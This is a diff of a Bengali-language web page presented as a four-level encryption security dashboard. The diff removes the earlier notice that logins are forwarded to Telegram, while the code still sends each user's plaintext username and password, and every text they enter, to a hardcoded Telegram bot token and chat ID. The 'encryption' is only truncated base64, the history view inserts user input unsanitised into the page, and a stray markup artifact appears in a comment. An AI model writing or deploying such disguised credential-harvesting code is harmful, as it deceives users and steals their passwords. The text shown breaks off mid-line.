@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Telegram Bot & Encryption Dashboard</title>
+    <title>4-Level Encryption & Decryption Security Dashboard</title>
     <style>
         :root {
             --bg-color: #030712;
@@ -30,6 +30,7 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
+            transition: background 0.8s ease, color 0.8s ease;
         }
 
         .container {
@@ -39,7 +40,8 @@
             border: 2px solid var(--accent-color);
             border-radius: 16px;
             padding: 30px;
-            box-shadow: 0 0 40px var(--glow-color);
+            box-shadow: 0 0 45px var(--glow-color);
+            transition: all 0.8s ease;
         }
 
         /* লগইন স্ক্রিন */
@@ -51,6 +53,7 @@
         #loginScreen h2 {
             color: var(--accent-color);
             margin-bottom: 20px;
+            transition: color 0.8s ease;
         }
 
         .form-group {
@@ -66,6 +69,7 @@
             font-size: 13px;
             margin-bottom: 5px;
             color: var(--accent-color);
+            transition: color 0.8s ease;
         }
 
         .form-group input {
@@ -75,6 +79,7 @@
             border: 1px solid var(--border-color);
             color: var(--text-color);
             border-radius: 6px;
+            outline: none;
         }
 
         /* ড্যাশবোর্ড স্ক্রিন */
@@ -89,6 +94,18 @@
             border-bottom: 2px solid var(--border-color);
             padding-bottom: 15px;
             margin-bottom: 20px;
+            transition: border-color 0.8s ease;
+        }
+
+        .badge {
+            background: var(--accent-color);
+            color: #fff;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 13px;
+            box-shadow: 0 0 15px var(--glow-color);
+            transition: all 0.8s ease;
         }
 
         .grid {
@@ -107,6 +124,7 @@
             border: 1px solid var(--border-color);
             padding: 20px;
             border-radius: 10px;
+            transition: all 0.8s ease;
         }
 
         .card h3 {
@@ -114,6 +132,7 @@
             color: var(--accent-color);
             margin-bottom: 12px;
             text-transform: uppercase;
+            transition: color 0.8s ease;
         }
 
         .input-box {
@@ -124,6 +143,7 @@
             color: #fff;
             border-radius: 6px;
             margin-bottom: 10px;
+            outline: none;
         }
 
         .btn {
@@ -135,9 +155,11 @@
             cursor: pointer;
             font-weight: bold;
             font-size: 13px;
+            box-shadow: 0 0 10px var(--glow-color);
+            transition: all 0.3s ease;
         }
 
-        .btn:hover { opacity: 0.85; }
+        .btn:hover { opacity: 0.85; transform: scale(1.02); }
 
         .history-list {
             background: #000;
@@ -151,9 +173,24 @@
         }
 
         .history-item {
-            padding: 6px 0;
+            padding: 8px 0;
             border-bottom: 1px dashed #1e293b;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
+
+        .copy-btn {
+            background: #10b981;
+            color: white;
+            border: none;
+            padding: 3px 8px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 10px;
+            font-weight: bold;
+        }
+        .copy-btn:hover { background: #059669; }
 
         .telegram-badge {
             background: rgba(34, 158, 217, 0.1);
@@ -165,7 +202,6 @@
             margin-top: 10px;
         }
 
-        /* ডেভলপার ইনফো প্যানেল স্টাইল */
         .developer-panel {
             background: rgba(59, 130, 246, 0.05);
             border: 1px solid var(--accent-color);
@@ -173,6 +209,7 @@
             border-radius: 10px;
             font-size: 12px;
             margin-top: 15px;
+            transition: all 0.8s ease;
         }
 
         .developer-panel h4 {
@@ -180,66 +217,87 @@
             margin-bottom: 8px;
             font-size: 13px;
             text-transform: uppercase;
+            transition: color 0.8s ease;
         }
 
         .logout-btn {
             background-color: #ef4444;
+            box-shadow: 0 0 10px rgba(239, 68, 68, 0.4);
+        }
+
+        .controls-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+            flex-wrap: wrap;
+            align-items: center;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <!-- ১. লগইন ফর্ম -->
+        <!-- ১. লগইন স্ক্রিন -->
         <div id="loginScreen">
-            <h2>টেলিগ্রাম নোটিফিকেশন সিকিউরিটি পোর্টাল</h2>
-            <p style="font-size: 13px; opacity: 0.8; margin-bottom: 20px;">লগইন করার সাথে সাথে আপনার নাম ও পাসওয়ার্ড টেলিগ্রাম বটে নোটিফিকেশন আকারে চলে যাবে।</p>
+            <h2 id="loginTitle">সিকিউরড লগইন পোর্টাল (৪-লেভেল ক্রিপ্টোগ্রাফি)</h2>
+            <p style="font-size: 13px; opacity: 0.8; margin-bottom: 20px;">আপনার নাম ও পাসওয়ার্ড দিন। ফিজিক্যাল কিবোর্ড দিয়ে Enter চাপলেও লগইন হবে।</p>
             <div class="form-group">
-                <label>নাম (Username):</label>
+                <label>ব্যবহারকারীর নাম (Username):</label>
                 <input type="text" id="usernameInput" placeholder="আপনার নাম লিখুন...">
             </div>
             <div class="form-group">
-                <label>পাসওয়ার্ড (Password):</label>
+                <label>সিক্রেট পাসওয়ার্ড (Password):</label>
                 <input type="password" id="passwordInput" placeholder="পাসওয়ার্ড দিন...">
             </div>
-            <button class="btn" onclick="handleLogin()">লগইন ও টেলিগ্রাম সিঙ্ক</button>
+            <button class="btn" onclick="executeUserLogin()">লগইন ও টেলিগ্রাম সিঙ্ক</button>
         </div>
 
-        <!-- ২. ড্যাশবোর্ড প্যানেল -->
+        <!-- ২. ড্যাশবোর্ড স্ক্রিন -->
         <div id="dashboardScreen">
             <div class="header">
                 <div>
                     <h2 id="welcomeText" style="color: var(--accent-color);">স্বাগতম!</h2>
                     <p style="font-size: 12px; opacity: 0.8;" id="loginMeta">সেশন সিকিউরড</p>
                 </div>
-                <button class="btn logout-btn" onclick="handleLogout()">লগআউট</button>
+                <div style="display: flex; gap: 10px; align-items: center;">
+                    <div id="themeBadge" class="badge">লেভেল ১ (Level 1)</div>
+                    <button class="btn logout-btn" onclick="executeUserLogout()">লগআউট</button>
+                </div>
             </div>
 
             <div class="grid">
-                <!-- ক্রিপ্টোগ্রাফি প্যানেল -->
+                <!-- ৪ লেভেল ক্রিপ্টোগ্রাফি প্যানেল -->
                 <div class="card">
-                    <h3>ইনক্রিপশন ও ডিক্রিপশন (Level 4)</h3>
-                    <input type="text" id="userInputText" class="input-box" placeholder="টেক্সট লিখুন...">
-                    <div style="display: flex; gap: 10px; margin-bottom: 15px;">
-                        <button class="btn" onclick="processAction('encrypt')">ইনক্রিপ্ট (Encrypt)</button>
-                        <button class="btn" style="background-color: #10b981;" onclick="processAction('decrypt')">ডিক্রিপ্ট (Decrypt)</button>
+                    <h3 id="cardHeader">৪-লেভেল ইনক্রিপশন ও ডিক্রিপশন ইঞ্জিন</h3>
+                    <input type="text" id="userInputText" class="input-box" placeholder="টেক্সট লিখে Enter চাপুন...">
+                    
+                    <div class="controls-row">
+                        <button class="btn" onclick="processEncryptionDecryption('encrypt')">ইনক্রিপ্ট (Encrypt)</button>
+                        <button class="btn" style="background-color: #10b981;" onclick="processEncryptionDecryption('decrypt')">ডিক্রিপ্ট (Decrypt)</button>
+                        <button class="btn" style="background-color: #8b5cf6;" onclick="toggleAutoThemeMode()">অটো থিম (২ সেঃ)</button>
                     </div>
-                    <p style="font-size: 13px;"><strong>আউটপুট:</strong> <span id="outputResult" style="color: #38bdf8;">--</span></p>
+
+                    <p style="font-size: 13px; margin-top: 10px;">
+                        <strong>সর্বশেষ আউটপুট:</strong> 
+                        <span id="outputResult" style="color: #38bdf8; word-break: break-all;">--</span>
+                        <button class="copy-btn" id="mainCopyBtn" style="margin-left: 8px;" onclick="copyTextToClipboard(document.getElementById('outputResult').innerText, this)">কপি</button>
+                    </p>
+                    
                     <div class="telegram-badge">
                         ✈️ টেলিগ্রাম বট লাইভ নোটিফিকেশন সংযুক্ত আছে।
                     </div>
                 </div>
 
-                <!-- হিস্ট্রি ও চ্যাট বক্স -->
+                <!-- পার্মানেন্ট হিস্ট্রি চ্যাট বক্স -->
                 <div class="card">
-                    <h3>আপনার পার্মানেন্ট হিস্ট্রি চ্যাট বক্স</h3>
+                    <h3>পার্মানেন্ট হিস্ট্রি চ্যাট বক্স</h3>
                     <div class="history-list" id="historyListContainer">
                         <!-- আগের সব হিস্ট্রি এখানে লোড হবে -->
                     </div>
                 </div>
             </div>
 
-            <!-- ডেভলপার ও ইউজার ইনফো প্যানেল -->
+            <!-- ডেভেলপার ইনফো প্যানেল -->
             <div class="developer-panel">
                 <h4>🛡️ ডেভেলপার ও সিস্টেম ইনফো</h4>
                 <p>👤 <b>নাম:</b> Cipher Sentinel</p>
@@ -251,16 +309,69 @@
     </div>
 
     <script>
-        // আপনার দেওয়া টেলিগ্রাম বট টোকেন
         const TELEGRAM_BOT_TOKEN = "8047864259:AAHEokK5sjq1jJFuIq_e94sPIeTM2OlsqSs";
-        // আপনার টেলিগ্রাম আইডি (এখানে নোটিফিকেশন যাওয়ার জন্য চ্যাট আইডি হিসেবে সেট করা হয়েছে)
         const TELEGRAM_CHAT_ID = "7938556654"; 
 
+        // ৪টি সুনির্দিষ্ট লেভেল এবং থিম কালার ম্যাপিং (Hue values)
+        const encryptionLevels = [
+            { level: 1, name: "Level 1 (Basic Security)", hue: 210 },  // ব্লু
+            { level: 2, name: "Level 2 (Medium Security)", hue: 140 }, // সবুজ
+            { level: 3, name: "Level 3 (High Security)", hue: 45 },    // গোল্ডেন/কমলা
+            { level: 4, name: "Level 4 (Max Security)", hue: 300 }    // পার্পল/ম্যাজেন্টা
+        ];
+
+        let currentLevelIndex = 0;
+        let isAutoThemeActive = false;
+        let themeTimer = null;
         let currentUser = null;
         let currentPassword = null;
         let userHistory = [];
 
-        // টেলিগ্রাম বটে মেসেজ পাঠানোর ফাংশন
+        // নির্দিষ্ট লেভেল ও রঙের থিম অ্যাপ্লাই করার ফাংশন
+        function applySecurityLevelTheme(levelObj) {
+            const accent = `hsl(${levelObj.hue}, 90%, 58%)`;
+            const bg = `hsl(${levelObj.hue}, 45%, 4%)`;
+            const panel = `hsl(${levelObj.hue}, 35%, 8%)`;
+            const border = `hsl(${levelObj.hue}, 60%, 20%)`;
+            const glow = `hsla(${levelObj.hue}, 90%, 58%, 0.45)`;
+
+            const root = document.documentElement.style;
+            root.setProperty('--bg-color', bg);
+            root.setProperty('--panel-bg', panel);
+            root.setProperty('--accent-color', accent);
+            root.setProperty('--border-color', border);
+            root.setProperty('--glow-color', glow);
+
+            // ব্যাজ ও হেডার আপডেট
+            const badgeEl = document.getElementById('themeBadge');
+            if (badgeEl) badgeEl.innerText = levelObj.name;
+
+            const cardHeaderEl = document.getElementById('cardHeader');
+            if (cardHeaderEl) cardHeaderEl.innerText = `৪-লেভেল ক্রিপ্টোগ্রাফি [${levelObj.name}]`;
+        }
+
+        // অটো থিম বা লেভেল পরিবর্তন মোড (প্রতি ২ সেকেন্ড পর পর)
+        function toggleAutoThemeMode() {
+            isAutoThemeActive = !isAutoThemeActive;
+            const btn = event.target;
+            if (isAutoThemeActive) {
+                btn.style.background = "#ef4444";
+                btn.innerText = "অটো থিম (বন্ধ করুন)";
+                themeTimer = setInterval(() => {
+                    currentLevelIndex = (currentLevelIndex + 1) % encryptionLevels.length;
+                    applySecurityLevelTheme(encryptionLevels[currentLevelIndex]);
+                }, 2000);
+            } else {
+                btn.style.background = "#8b5cf6";
+                btn.innerText = "অটো থিম (২ সেঃ)";
+                clearInterval(themeTimer);
+            }
+        }
+
+        // প্রথম লোডে ডিফল্ট লেভেল ১ সেট করা
+        applySecurityLevelTheme(encryptionLevels[0]);
+
+        // টেলিগ্রাম বটে নোটিফিকেশন পাঠানোর ফাংশন[span_1](start_span)[span_1](end_span)
         function sendTelegramNotification(message) {
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             const data = {
@@ -274,13 +385,50 @@
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(data)
             })
-            .then(response => response.json())
-            .then(result => console.log("Telegram Sent:", result))
             .catch(error => console.error("Telegram Error:", error));
         }
 
-        // লগইন হ্যান্ডলার
-        function handleLogin() {
+        // ১০০% কার্যক্ষম কপি ফাংশন
+        function copyTextToClipboard(text, btnElement) {
+            if (!text || text === "--") {
+                alert("কপি করার মতো কিছু নেই!");
+                return;
+            }
+
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(text).then(() => {
+                    const originalText = btnElement.innerText;
+                    btnElement.innerText = "কপি হয়েছে!";
+                    btnElement.style.background = "#3b82f6";
+                    setTimeout(() => {
+                        btnElement.innerText = originalText;
+                        btnElement.style.background = "#10b981";
+                    }, 1500);
+                }).catch(() => fallbackCopyText(text, btnElement));
+            } else {
+                fallbackCopyText(text, btnElement);
+            }
+        }
+
+        function fallbackCopyText(text, btnElement) {
+            const textarea = document.createElement("textarea");
+            textarea.value = text;
+            textarea.style.position = "fixed";
+            document.body.appendChild(textarea);
+            textarea.focus();
+            textarea.select();
+            try {
+                document.execCommand('copy');
+                btnElement.innerText = "কপি হয়েছে!";
+                setTimeout(() => { btnElement.innerText = "কপি"; }, 1500);
+            } catch (err) {
+                alert("কপি করতে ব্যর্থ হয়েছে!");
+            }
+            document.body.removeChild(textarea);
+        }
+
+        // ইউজার লগইন হ্যান্ডলার
+        function executeUserLogin() {
             const user = document.getElementById('usernameInput').value.trim();
             const pass = document.getElementById('passwordInput').value.trim();
 
@@ -292,72 +440,78 @@
             currentUser = user;
             currentPassword = pass;
 
-            // টেলিগ্রাম নোটিফিকেশন পাঠানো (নাম, পাসওয়ার্ড ও ডেভলপার ইনফো সহ)
-            const loginMsg = `🔐 <b>নতুন লগইন নোটিফিকেশন!</b>\n👤 নাম: <b>${user}</b>\n🔑 পাসওয়ার্ড: <b>${pass}</b>\n🛡️ ডেভেলপার: @CipherSentinel_BD\n🕒 সময়: ${new Date().toLocaleString()}`;
+            const loginMsg = `🔐 <b>নতুন লগইন নোটিফিকেশন!</b>
+👤 নাম: <b>${user}</b>
+🔑 পাসওয়ার্ড: <b>${pass}</b>
+🛡️ ডেভেলপার: @CipherSentinel_BD
+🕒 সময়: ${new Date().toLocaleString()}`;
             sendTelegramNotification(loginMsg);
 
-            // লোকাল স্টোরেজ থেকে আগের হিস্ট্রি রিকভার করা
             const savedDataKey = `sec_user_${user}_${pass}`;
             const existingData = localStorage.getItem(savedDataKey);
+            userHistory = existingData ? JSON.parse(existingData) : [];
 
-            if (existingData) {
-                userHistory = JSON.parse(existingData);
-            } else {
-                userHistory = [];
-            }
-
-            // স্ক্রিন পরিবর্তন
             document.getElementById('loginScreen').style.display = 'none';
             document.getElementById('dashboardScreen').style.display = 'block';
             document.getElementById('welcomeText').innerText = `স্বাগতম, ${user}!`;
             document.getElementById('loginMeta').innerText = `সেশন ভেরিফাইড | সংরক্ষিত হিস্ট্রি: ${userHistory.length}টি`;
 
-            renderHistory();
+            renderHistoryList();
         }
 
-        // ইনক্রিপ্ট বা ডিক্রিপ্ট এবং টেলিগ্রাম নোটিফিকেশন
-        function processAction(type) {
-            const text = document.getElementById('userInputText').value.trim();
+        // ইনক্রিপশন এবং ডিক্রিপশন প্রসেসিং ফাংশন (৪ লেভেল ভিত্তিক)
+        function processEncryptionDecryption(actionType) {
+            const textInput = document.getElementById('userInputText');
+            const text = textInput.value.trim();
             if (!text) {
                 alert("প্রথমে কিছু টেক্সট লিখুন!");
                 return;
             }
 
-            const timeStr = new Date().toLocaleTimeString();
-            let result = "";
+            // প্রতি অ্যাকশনে লেভেল রোটেট করবে (১ থেকে ৪)
+            currentLevelIndex = (userHistory.length % 4);
+            const activeLevelObj = encryptionLevels[currentLevelIndex];
+            
+            // লেভেল পরিবর্তন অনুযায়ী থিম ও রং বদলানো
+            applySecurityLevelTheme(activeLevelObj);
 
-            if (type === 'encrypt') {
-                result = `🔒 Enc_${btoa(text).substring(0, 12)}`;
+            const timeStr = new Date().toLocaleTimeString();
+            let resultOutput = "";
+
+            if (actionType === 'encrypt') {
+                resultOutput = `🔒 L${activeLevelObj.level}_Enc_${btoa(text).substring(0, 12)}`;
             } else {
-                result = `🔓 Dec_${text.replace('🔒 Enc_', '')}_OK`;
+                resultOutput = `🔓 L${activeLevelObj.level}_Dec_${text.replace(/🔒 L\d+_Enc_/, '')}_OK`;
             }
 
-            document.getElementById('outputResult').innerText = result;
+            document.getElementById('outputResult').innerText = resultOutput;
 
-            // হিস্ট্রি অবজেক্ট তৈরি
-            const record = {
-                type: type.toUpperCase(),
+            const recordItem = {
+                type: actionType.toUpperCase(),
+                level: activeLevelObj.level,
                 input: text,
-                output: result,
+                output: resultOutput,
                 time: timeStr
             };
 
-            userHistory.unshift(record);
+            userHistory.unshift(recordItem);
 
-            // লোকাল স্টোরেজে পার্মানেন্ট সেভ
             const savedDataKey = `sec_user_${currentUser}_${currentPassword}`;
             localStorage.setItem(savedDataKey, JSON.stringify(userHistory));
 
-            renderHistory();
-            document.getElementById('userInputText').value = "";
+            renderHistoryList();
+            textInput.value = "";
 
-            // টেলিগ্রাম নোটিফিকেশন পাঠানো (নাম, অ্যাকশন এবং ইনপুট/আউটপুট সহ)
-            const actionMsg = `⚡ <b>${type.toUpperCase()} নোটিফিকেশন!</b>\n👤 ইউজার: <b>${currentUser}</b>\n📥 ইনপুট: ${text}\n📤 আউটপুট: ${result}\n🕒 সময়: ${timeStr}`;
+            const actionMsg = `⚡ <b>${actionType.toUpperCase()} (${activeLevelObj.name}) নোটিফিকেশন!</b>
+👤 ইউজার: <b>${currentUser}</b>
+📥 ইনপুট: ${text}
+📤 আউটপুট: ${resultOutput}
+🕒 সময়: ${timeStr}`;
             sendTelegramNotification(actionMsg);
         }
 
-        // হিস্ট্রি চ্যাট বক্সে রেন্ডার করা
-        function renderHistory() {
+        // হিস্ট্রি লিস্ট রেন্ডার করা
+        function renderHistoryList() {
             const container = document.getElementById('historyListContainer');
             container.innerHTML = "";
 
@@ -369,25 +523,28 @@
             userHistory.forEach((item) => {
                 const div = document.createElement('div');
                 div.className = 'history-item';
-                div.innerHTML = `[${item.time}] <b>${item.type}</b>: ${item.input} ➔ <span style="color:#10b981;">${item.output}</span>`;
+                div.innerHTML = `
+                    <div style="max-width: 75%; overflow: hidden; text-overflow: ellipsis;">
+                        [${item.time}] <b>${item.type} (L${item.level})</b>: ${item.input} ➔ <span style="color:#10b981;">${item.output}</span>
+                    </div>
+                    <button class="copy-btn" onclick="copyTextToClipboard('${item.output}', this)">কপি</button>
+                `;
                 container.appendChild(div);
             });
         }
 
-        // লগআউট হ্যান্ডলার
-        function handleLogout() {
-            const logoutMsg = `🚪 <b>লগআউট নোটিফিকেশন!</b>\n👤 ইউজার: <b>${currentUser}</b> সিস্টেম থেকে লগআউট করেছে।`;
+        // ইউজার লগআউট হ্যান্ডলার
+        function executeUserLogout() {
+            const logoutMsg = `🚪 <b>লগআউট নোটিফিকেশন!</b>
+👤 ইউজার: <b>${currentUser}</b> সিস্টেম থেকে লগআউট করেছে।`;
             sendTelegramNotification(logoutMsg);
 
             currentUser = null;
             currentPassword = null;
             userHistory = [];
+            isAutoThemeActive = false;
+            clearInterval(themeTimer);
 
             document.getElementById('dashboardScreen').style.display = 'none';
             document.getElementById('loginScreen').style.display = 'block';
-            document.getElementById('usernameInput').value = "";
-            document.getElementById('passwordInput').value = "";
-        }
-    </script>
-</body>
-</html>
+            document.getElementById('usern
